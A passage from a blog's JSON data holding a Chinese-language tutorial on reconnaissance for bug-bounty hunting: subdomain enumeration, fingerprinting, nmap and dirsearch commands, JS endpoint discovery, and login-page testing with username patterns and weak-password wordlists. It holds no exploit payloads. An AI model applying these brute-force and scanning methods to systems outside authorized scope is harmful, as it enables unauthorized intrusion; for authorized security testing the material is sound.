title=\"1、公众号\"></a>1、公众号</h3><p>从公众号推文入手，活动页面中可以发现测试范围<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963158654-f2016b05-9be3-4cd7-9bda-ea55a87defb1.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u077f22ee&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=190701&status=done&style=none&taskId=u56153bbe-9613-4ac9-96e0-549a84f1c4b&width=726\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963557707-c9d9fa67-1108-49c4-b38a-a74b34a3907f.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u1c25375f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=285450&status=done&style=none&taskId=ue71919ac-0609-45cc-bc63-c3b9f4d2e1c&width=726\" alt=\"image.png\"></p>\n<h3 id=\"2、应急响应官网\"><a href=\"#2、应急响应官网\" class=\"headerlink\" title=\"2、应急响应官网\"></a>2、应急响应官网</h3><p>在应急响应官网，往往会有一些活动的公告，在里面可以获取到相应的测试范围。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963624546-d5d91332-8080-4b77-9972-77fc8abb52bb.png#clientId=u713ba10f-a757-4&from=paste&height=627&id=u128b3210&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1254&originWidth=2206&originalType=binary&ratio=1&size=321049&status=done&style=none&taskId=u0aa25af0-c011-434c-92f5-f7e3a65d236&width=1103\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963709884-04818b7a-2686-4c31-b96b-270fd21af35b.png#clientId=u713ba10f-a757-4&from=paste&height=656&id=u3228ec56&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1312&originWidth=2382&originalType=binary&ratio=1&size=592096&status=done&style=none&taskId=u83999522-9aaa-4b01-b710-a57b9ff4f7f&width=1191\" alt=\"image.png\"></p>\n<h3 id=\"3、爱企查\"><a href=\"#3、爱企查\" class=\"headerlink\" title=\"3、爱企查\"></a>3、爱企查</h3><p>从爱企查等商业查询平台获取公司所属域名<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964085716-15745fa8-785a-4209-b610-668ece5133a0.png#clientId=u713ba10f-a757-4&from=paste&height=484&id=u412ef52f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=968&originWidth=2188&originalType=binary&ratio=1&size=786218&status=done&style=none&taskId=u55826600-0854-44f8-accb-54e3f12c347&width=1094\" alt=\"image.png\"><br>搜索想要测试等SRC所属公司名称，在知识产权-&gt;网站备案中可以获取测试范围。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964167749-6d7913b9-a4be-41ce-a417-88f49ebd7673.png#clientId=u713ba10f-a757-4&from=paste&height=567&id=u96bf1fb3&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1134&originWidth=1884&originalType=binary&ratio=1&size=298889&status=done&style=none&taskId=ua446ee4f-aa26-41c6-8e34-ba5e91db54e&width=942\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964215181-046d3df9-0dbb-44f2-ba89-59ecdee77f71.png#clientId=u713ba10f-a757-4&from=paste&height=665&id=uf3208897&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1330&originWidth=1836&originalType=binary&ratio=1&size=280408&status=done&style=none&taskId=u8bb717b4-4748-4fbd-b919-6102ba1883b&width=918\" alt=\"image.png\"></p>\n<h2 id=\"0x03-子域名-oneforall\"><a href=\"#0x03-子域名-oneforall\" class=\"headerlink\" title=\"0x03 子域名(oneforall)\"></a>0x03 子域名(oneforall)</h2><p>拿到域名之后，下一步我考虑使用oneforall扫描获取子域名，就像网上信息收集的文章一样，主域名的站点不是静态界面就是安全防护等级极强，不是随便就能够发现漏洞的，我们挖掘SRC也是要从子域名开始，从边缘资产或一般资产中发现漏洞。<br>工具下载：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></figure>\n<p>具体用法如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634967168625-da7d57b5-19e1-4f9c-91a2-cd55e8072344.png#clientId=u713ba10f-a757-4&from=paste&height=442&id=u73c9b970&margin=%5Bobject%2Object%5D&name=image.png&originHeight=884&originWidth=1460&originalType=binary&ratio=1&size=385397&status=done&style=none&taskId=ub7b3972f-c412-4a4e-a3c0-224717feaa2&width=730\" alt=\"image.png\"><br>常用的获取子域名有2种选择，一种使用–target指定单个域名，一种使用–targets指定域名文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 oneforall.py --target example.com run</span><br><span class=\"line\">python3 oneforall.py --targets ./domains.txt run</span><br></pre></td></tr></table></figure>\n<p>其他获取子域名的工具还有layer子域名挖掘机、Sublist3r、证书透明度、在线工具等，这里就不一一阐述了，大体思路是一样等，获取子域，然后从中筛选边缘资产，安全防护低资产。</p>\n<h2 id=\"0x04-系统指纹探测\"><a href=\"#0x04-系统指纹探测\" class=\"headerlink\" title=\"0x04 系统指纹探测\"></a>0x04 系统指纹探测</h2><p>通过上面的方法，我们可以在/OneForAll-0.4.3/results/路径下获取以域名为名字的csv文件。里面放入到便是扫描到到所有子域名以及相应信息了。<br>下一步便是将收集到到域名全部进行一遍指纹探测，从中找出一些明显使用CMS、OA系统、shiro、Fastjson等的站点。下面介绍平时使用的2款工具：</p>\n<h3 id=\"1、Ehole\"><a href=\"#1、Ehole\" class=\"headerlink\" title=\"1、Ehole\"></a>1、Ehole</h3><p>下载地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/EdgeSecurityTeam/EHole</span><br></pre></td></tr></table></figure>\n<p>使用方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./Ehole-darwin -l url.txt   //URL地址需带上协议,每行一个</span><br><span class=\"line\">./Ehole-darwin -f 192.168.1.1/24  //支持单IP或IP段,fofa识别需要配置fofa密钥和邮箱</span><br><span class=\"line\">./Ehole-darwin -l url.txt -json export.json  //结果输出至export.json文件</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968178111-36292547-bea8-487c-a8cf-722c63427df3.png#clientId=u713ba10f-a757-4&from=paste&height=415&id=u3671b8ae&margin=%5Bobject%2Object%5D&name=image.png&originHeight=830&originWidth=1460&originalType=binary&ratio=1&size=320488&status=done&style=none&taskId=u181ebb87-7fc2-4806-81f9-6a3c42cf463&width=730\" alt=\"image.png\"></p>\n<h3 id=\"2、Glass\"><a href=\"#2、Glass\" class=\"headerlink\" title=\"2、Glass\"></a>2、Glass</h3><p>下载地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/s7ckTeam/Glass</span><br></pre></td></tr></table></figure>\n<p>使用方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 Glass.py -u http://www.examples.com  // 单url测试</span><br><span class=\"line\">python3 Glass.py -w domain.txt -o 1.txt  // url文件内</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968385558-f19e053b-b480-4bbb-8995-3cc50cb19ea1.png#clientId=u713ba10f-a757-4&from=paste&height=499&id=uc057208f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=998&originWidth=1460&originalType=binary&ratio=1&size=357066&status=done&style=none&taskId=u2dd4f645-9400-4a16-90f9-567e1292a6c&width=730\" alt=\"image.png\"></p>\n<h2 id=\"0x05-框架型站点漏洞测试\"><a href=\"#0x05-框架型站点漏洞测试\" class=\"headerlink\" title=\"0x05 框架型站点漏洞测试\"></a>0x05 框架型站点漏洞测试</h2><p>前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，我们可以优先进行测试。<br>类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971752296-14f4cc8b-a9ad-4f4a-a52d-b37290bf0889.png#clientId=u713ba10f-a757-4&from=paste&height=670&id=ue2eb2d79&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1340&originWidth=1796&originalType=binary&ratio=1&size=633891&status=done&style=none&taskId=uc617d959-80c1-4194-ba8a-5a20f30043a&width=898\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971772511-ad2c33fa-0dcf-4e7b-8a36-ada77f0d208d.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=uf7ff8327&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=311843&status=done&style=none&taskId=u10544bf0-4a12-4c42-bf41-7e9c5d45057&width=680\" alt=\"image.png\"></p>\n<h2 id=\"0x06-非框架型站点漏洞测试\"><a href=\"#0x06-非框架型站点漏洞测试\" class=\"headerlink\" title=\"0x06 非框架型站点漏洞测试\"></a>0x06 非框架型站点漏洞测试</h2><p>前面测试完框架型的站点了，之后就应该往正常网站，或者经过了二开未能直接检测出指纹的站点进行渗透了。那么对于这类站点，最经常遇到的便是登录框，在这里，我们便可以开始测试了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634972124912-1bf2fa5c-a1ac-40b0-b6b9-71fea6341075.png#clientId=u713ba10f-a757-4&from=paste&height=416&id=uc47928c9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=832&originWidth=1322&originalType=binary&ratio=1&size=623185&status=done&style=none&taskId=ubc371a35-7ed8-4893-9488-84188fd50cf&width=661\" alt=\"image.png\"><br>1、用户名枚举<br>抓包尝试是否用户名存在与不存在的情况，返回结果不同。<br>2、验证码<br>是否存在验证码，验证码是否可以抓包截断绕过，验证码是否可以为空。<br>3、暴力破解<br>下面是我收集的集中常见的用户名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.弱口令用户名如admin,test,ceshi等</span><br><span class=\"line\">2.员工姓名全拼，员工姓名简拼</span><br><span class=\"line\">3.公司特征+员工工号/员工姓名</span><br><span class=\"line\">4.员工工号+姓名简拼</span><br><span class=\"line\">5.员工姓名全拼+员工工号</span><br><span class=\"line\">6.员工姓名全拼+重复次数，如zhangsan和zhangsan01</span><br><span class=\"line\">7.其他</span><br></pre></td></tr></table></figure>\n<p>关于暴力破解我要扯一句了，就是关于密码字典的问题。经常会听到某人说他的字典多么多么的大，有好几个G之类的，但是在我觉得，这很没有必要，有些密码是你跑几天都跑不出来的，就算字典确实够大，也没有必要这样跑，可能影响心情不说，大规模地暴力破解，很容易让人觉得你在拒绝服务攻击。<br>​</p>\n<p>其实我的话一般跑一跑弱口令就差不多了。<br>关于弱口令字典的问题，我也想说一嘴，你最好看看，你字典里面的admin、123456、password处在什么位置。记得之前玩CTF的时候，默认密码123456，但是那个师傅死活做不出来，后面一看，字典里面居然没有123456这个密码。。。<br>​</p>\n<p>这里推荐一个字典，个人感觉还是挺好用的。当然更多的是需要自己不断更新。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/fuzz-security/SuperWordlist</span><br></pre></td></tr></table></figure>\n<p>4、工具cupp和cewl<br>对于一些情况，密码不是直接使用弱口令，而是通过一些公司的特征+个人信息制作的，那么这个时候，我们的字典便不能直接使用了，需要在这之前加上一些特征，例如阿里SRC可能是a；百度SRC可能是bd等。<br>下面2款kali自带等工具，可以通过收集信息，生成好用的字典，方便渗透。说真的，在渗透测试过程中，弱口令，YYDS！<br>具体使用说明和工具介绍，可以查看文章：<br><a href=\"https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A\">https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A</a><br>5、自行注册<br>如果能够注册那就好办了，自己注册一下账户即可。<br>6、小总结<br>对于非框架的站点，登录接口一般是必不可少的，可能就在主页，也可能在某个路径下，藏着后台的登录接口，在尝试了多种方法成功登录之后，记得尝试里面是否存在未授权漏洞、越权等漏洞。<br>这里借用来自WS师傅的建议：可以直接扫描出来的洞，基本都被交完了，可以更多往逻辑漏洞方面找。登录后的漏洞重复率，比登录前的往往会低很多。</p>\n<h2 id=\"0x07-端口扫描\"><a href=\"#0x07-端口扫描\" class=\"headerlink\" title=\"0x07 端口扫描\"></a>0x07 端口扫描</h2><p>前面就是正常的渗透了，那么一个域名只是在80、443端口才有web服务吗？不可否认有些时候真的是，但是绝大多数情况下，类似8080、8443、8081、8089、7001等端口，往往会有惊喜哦～<br>端口扫描也算是老生常谈了，市面上也有很多介绍端口扫描的工具使用方法，这里也不细说了，就放出平时使用的命令吧。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v  examples.com</span><br><span class=\"line\"></span><br><span class=\"line\">sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 examples.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x08-目录扫描dirsearch\"><a href=\"#0x08-目录扫描dirsearch\" class=\"headerlink\" title=\"0x08 目录扫描dirsearch\"></a>0x08 目录扫描dirsearch</h2><p>目录扫描在渗透测试过程中我认为是必不可少的，一个站点在不同目录下的不同文件，往往可能有惊喜哦。<br>个人是喜欢使用dirserach这款工具，不仅高效、页面也好看。市面上还有例如御剑、御剑t00ls版等，也是不错的选择。<br>dirsearch下载地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/maurosoria/dirsearch</span><br></pre></td></tr></table></figure>\n<p>具体使用方法可以查看github介绍，这里我一般是使用如下命令（因为担心线程太高所以通过-t参数设置为2）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 dirsearch.py -u www.xxx.com -e * -t 2</span><br></pre></td></tr></table></figure>\n<p>关键的地方是大家都可以下载这款工具，获取它自带的字典，那么路径的话，便是大家都能够搜得到的了，所以这里我推荐是可以适当整合一些师傅们发出来的路径字典到/dirsearch-0.4.2/db/dicc.txt中。例如我的话，是增加了springboot未授权的一些路径、swagger的路径以及一些例如vmvare-vcenter的漏洞路径。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634974064316-4b6934a1-20a6-4491-bd58-90ce95839dc2.png#clientId=u713ba10f-a757-4&from=paste&height=418&id=ucf26188a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=836&originWidth=1364&originalType=binary&ratio=1&size=132938&status=done&style=none&taskId=uec31186e-75ff-4ff7-bd63-c714e41f7df&width=682\" alt=\"image.png\"></p>\n<h2 id=\"0x09-JS信息收集\"><a href=\"#0x09-JS信息收集\" class=\"headerlink\" title=\"0x09 JS信息收集\"></a>0x09 JS信息收集</h2><p>在一个站点扫描了目录、尝试登录失败并且没有自己注册功能的情况下，我们还可以从JS文件入手，获取一些URL，也许某个URL便能够未授权访问获取敏感信息呢。</p>\n<h4 id=\"1、JSFinder\"><a href=\"#1、JSFinder\" class=\"headerlink\" title=\"1、JSFinder\"></a>1、JSFinder</h4><p>工具下载：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/Threezh1/JSFinder</span><br></pre></td></tr></table></figure>\n<p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。个人觉得美中不足的地方便是不能对获取到到URL进行一些过滤，在某些情况下，JS文件中可以爬取非常多的URL，这其中可能大部分是页面空或者返回200但是页面显示404的。来自HZ师傅的建议，可以修改一下工具，基于当前的基础上，检测获取的URL是否可以访问，访问后的页面大小为多少，标题是什么。。。<br>思路放这了，找个时间改一改？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#检测URL状态码</span><br><span class=\"line\">#-----------------------</span><br><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=&#x27;xxxx&#x27;</span><br><span class=\"line\">request = requests.get(url)</span><br><span class=\"line\">httpStatusCode = request.status_code</span><br><span class=\"line\">if httpStatusCode == 200:</span><br><span class=\"line\">    xxxx</span><br><span class=\"line\">else:</span><br><span class=\"line\">\t\txxxx</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#检测URL返回包大小</span><br><span class=\"line\">#-----------------------</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">def hum_convert(value):</span><br><span class=\"line\">    units = [&quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot;]</span><br><span class=\"line\">    size = 1024.0</span><br><span class=\"line\">    for i in range(len(units)):</span><br><span class=\"line\">        if (value / size) &lt; 1:</span><br><span class=\"line\">            return &quot;%.2f%s&quot; % (value, units[i])</span><br><span class=\"line\">        value = value / size</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class=\"line\">r.status_code</span><br><span class=\"line\">r.headers</span><br><span class=\"line\"></span><br><span class=\"line\">length = len(r.text)</span><br><span class=\"line\">print(hum_convert(length))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取网站标题</span><br><span class=\"line\">#-----------------------</span><br><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">urllib.request</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">url = urllib.request.urlopen(&#x27;http://www.xxx.com&#x27;)</span><br><span class=\"line\">html = url.read().decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">title=re.findall(&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;,html)</span><br><span class=\"line\">print (title)</span><br></pre></td></tr></table></figure>\n<h4 id=\"2、JS文件\"><a href=\"#2、JS文件\" class=\"headerlink\" title=\"2、JS文件\"></a>2、JS文件</h4><p>JS文件与HTML、CSS等文件统一作为前端文件，是可以通过浏览器访问到的，相对于HTML和CSS等文件的显示和美化作用，JS文件将会能够将页面的功能点进行升华。<img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979609194-1625b496-f395-46ef-a57b-d40812e3ca83.png#clientId=u713ba10f-a757-4&from=paste&height=41&id=udf5e6bd9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=82&originWidth=1052&originalType=binary&ratio=1&size=16086&status=done&style=none&taskId=u48d38e72-9bd0-43d2-ad50-bcc0ce56aec&width=526\" alt=\"image.png\"><br>对于渗透测试来说，JS文件不仅仅能够找到一些URL、内网IP地址、手机号、调用的组件版本等信息，还存在一些接口，因为前端需要，所以一些接口将会在JS文件中直接或间接呈现。下面我将介绍如何发现这些隐藏的接口。<br>1、首先在某个页面中，鼠标右键，选择检查<img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979847526-bc9f09c0-1a90-455d-ba9e-21f6a85077b2.png#clientId=u713ba10f-a757-4&from=paste&height=727&id=u06aaf698&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1454&originWidth=2364&originalType=binary&ratio=1&size=884946&status=done&style=none&taskId=u680f6578-9ead-4a4d-a566-d93f3fb8e26&width=1182\" alt=\"image.png\"><br>2、点击Application<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979884349-2daca2ef-6982-41b2-bb71-5c764816e908.png#clientId=u713ba10f-a757-4&from=paste&height=399&id=u951102d4&margin=%5Bobject%2Object%5D&name=image.png&originHeight=798&originWidth=1772&originalType=binary&ratio=1&size=290368&status=done&style=none&taskId=ud0a0670c-1fa3-4315-867c-25409dd85f8&width=886\" alt=\"image.png\"><br>3、在Frames-&gt;top-&gt;Scripts中能够获取当前页面请求到的所有JS<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979911722-aedd9206-580a-476c-aafe-5e99d91a2d47.png#clientId=u713ba10f-a757-4&from=paste&height=604&id=u785851a2&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1208&originWidth=1148&originalType=binary&ratio=1&size=133350&status=done&style=none&taskId=udc4effe1-a736-4b7d-884e-b10381b8c03&width=574\" alt=\"image.png\"><br>4、火狐浏览器的话，则是在调试中<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980094740-b4afaf82-8f10-4f64-b368-da3faa3f5d93.png#clientId=u713ba10f-a757-4&from=paste&height=323&id=ua48ca828&margin=%5Bobject%2Object%5D&name=image.png&originHeight=646&originWidth=1646&originalType=binary&ratio=1&size=188824&status=done&style=none&taskId=ucae14475-c2e8-489d-98d3-a672350edf4&width=823\" alt=\"image.png\"><br>5、如果你请求的JS文件内容都叠在了前几行的话，下面这个键可以帮你美化输出<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980174451-835cf97c-8c17-4d2a-a372-469073a78281.png#clientId=u713ba10f-a757-4&from=paste&height=269&id=u80fc4db5&margin=%5Bobject%2Object%5D&name=image.png&originHeight=850&originWidth=1420&originalType=binary&ratio=1&size=78688&status=done&style=none&taskId=ud815e24c-4503-40d1-a91c-ae3ec92a358&width=449\" alt=\"image.png\"><br>6、在JS文件中，可以尤为注意带有api字眼的文件或内容，例如下面这里我发现了一个接口。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980516041-202ef7c0-0773-45fc-8ea0-8935ad385603.png#clientId=u713ba10f-a757-4&from=paste&height=427&id=udeb8bb8a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=854&originWidth=1400&originalType=binary&ratio=1&size=199487&status=done&style=none&taskId=ue53b03c2-3b94-4dda-8b57-943ff687ffe&width=700\" alt=\"image.png\"></p>\n<h2 id=\"0x10-小程序、APP\"><a href=\"#0x10-小程序、APP\" class=\"headerlink\" title=\"0x10 小程序、APP\"></a>0x10 小程序、APP</h2><p>web端没有思路的时候，可以结合小程序、APP来进行渗透。小程序或APP的服务端其实可以在一定程度上与web应用的服务端相联系。也就是说，我们在小程序或者APP上，一样能够挖掘web端的漏洞如SQL注入、XSS等，并且相对来说，这类等服务端安全措施会相对没有那么完备，所以在web端确实没有思路的时候，可以迂回渗透，从小程序、APP中进行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#小程序抓包、APP抓包参考链接：</span><br><span class=\"line\">https://mp.weixin.qq.com/s/xuoVxBsN-t5KcwuyGpR56g</span><br><span class=\"line\">https://mp.weixin.qq.com/s/45YF4tBaR-TUsHyF5RvEsw</span><br><span class=\"line\">https://mp.weixin.qq.com/s/M5xu_-_6fgp8q0KjpzvjLg</span><br><span class=\"line\">https://mp.weixin.qq.com/s/Mfkbxtrxv5AvY-n_bMU7ig</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x11-总结\"><a href=\"#0x11-总结\" class=\"headerlink\" title=\"0x11 总结\"></a>0x11 总结</h2><p>​        以上就是我个人挖掘SRC的一些信息收集思路，挖掘SRC有的时候真的很看运气，也许别人对一个接口简单Fuzz，便出了一个注入，而我们花了几天，还是一直看到返回内容为404。所以有的时候真的可以换个站试试，也许就挖到高危甚至严重了～<br>​        作为一名SRC小白，以上内容均为小弟拙见，希望能够通过这篇文章，帮到更多的网络安全小白，没能帮上大佬们真的很抱歉～后续也会持续提高自己，将学到的更多的东西分享给大家。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckt46mpet0001vkq39a8mef0p","category_id":"ckt46mpey0004vkq3cusm9403","_id":"ckt46mpf8000hvkq3h48i5il0"},{"post_id":"ckt46mpex0003vkq3hpt0f48f","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfa000mvkq3bcwk89nc"},{"post_id":"ckt46mpf8000kvkq31fqzf0cu","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfe000rvkq3h8vj86ow"},{"post_id":"ckt46mpf20009vkq315t260uz","category_id":"ckt46mpf8000ivkq38f1c955x","_id":"ckt46mpfh000vvkq359m842w8"},{"post_id":"ckt46mpf9000lvkq383uu0obl","category_id":"ckt46mpey0004vkq3cusm9403","_id":"ckt46mpfi000yvkq3317b7s6c"},{"post_id":"ckt46mpfc000pvkq3aypb1ps8","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfk0012vkq3939taj80"},{"post_id":"ckt46mpf3000bvkq3dw0q6zot","category_id":"ckt46mpf8000ivkq38f1c955x","_id":"ckt46mpfl0016vkq3hihw58fm"},{"post_id":"ckt46mpfe000uvkq3bkki71mg","category_id":"ckt46mpfe000svkq395k314eg","_id":"ckt46mpfm0019vkq3d1gregml"},{"post_id":"ckt46mpf6000fvkq3ejlw3yya","category_id":"ckt46mpfe000svkq395k314eg","_id":"ckt46mpfn001cvkq3ftpdgxqs"},{"post_id":"ckt46mpfi000xvkq3dwewdxul","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfo001fvkq35grpalzf"},{"post_id":"ckt46mpfj0011vkq3dhae2xlx","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfp001jvkq36eegenes"},{"post_id":"ckt46mpfk0015vkq31iiqgz5o","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfq001lvkq3adks75iu"},{"post_id":"ckt46mpfd000qvkq31kpm1r6y","category_id":"ckt46mpfj0010vkq3fgewgh18","_id":"ckt46mpfq001nvkq3h4ca35fo"},{"post_id":"ckt46mpfl0018vkq30fwz5qq6","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfr001ovkq3hig0fa4m"},{"post_id":"ckt46mpfm001bvkq3fp0672jj","category_id":"ckt46mpey0004vkq3cusm9403","_id":"ckt46mpfr001pvkq3d8fi3h9b"},{"post_id":"ckt46mpfn001evkq3h2i9a3sa","category_id":"ckt46mpey0004vkq3cusm9403","_id":"ckt46mpfr001svkq3778oe3x8"},{"post_id":"ckt46mpfo001ivkq35o2gb3ou","category_id":"ckt46mpey0004vkq3cusm9403","_id":"ckt46mpfs001uvkq3chu45fdj"},{"post_id":"ckt46mpfp001kvkq30l5p1owy","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpfs001xvkq31zrlgzln"},{"post_id":"ckt46mpgh0053vkq33gh6btbw","category_id":"ckt46mpf4000cvkq3digbgvwp","_id":"ckt46mpgk0058vkq36iqa2cuf"},{